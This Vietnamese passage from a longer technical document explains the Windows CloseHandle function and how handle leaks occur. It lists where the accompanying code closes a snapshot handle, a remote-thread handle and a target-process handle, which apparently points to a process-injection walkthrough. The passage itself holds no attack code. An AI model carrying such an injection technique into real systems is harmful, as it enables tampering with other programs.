  HANDLE hObject  // Handle cần đóng
);
```

**Vai trò:** Giải phóng handle khi không còn sử dụng (handle tiến trình, handle luồng, handle snapshot). Mỗi handle chiếm tài nguyên kernel — không đóng sẽ gây **rò rỉ handle** (handle leak), tích lũy qua nhiều lần chạy có thể làm cạn tài nguyên hệ thống.

**Trong code sử dụng tại:**
- `CloseHandle(hSnap)` — đóng snapshot sau khi duyệt xong
- `CloseHandle(hThread)` — đóng handle luồng từ xa sau khi chờ xong
- `CloseHandle(hProcess)` — đóng handle tiến trình đích khi kết thúc
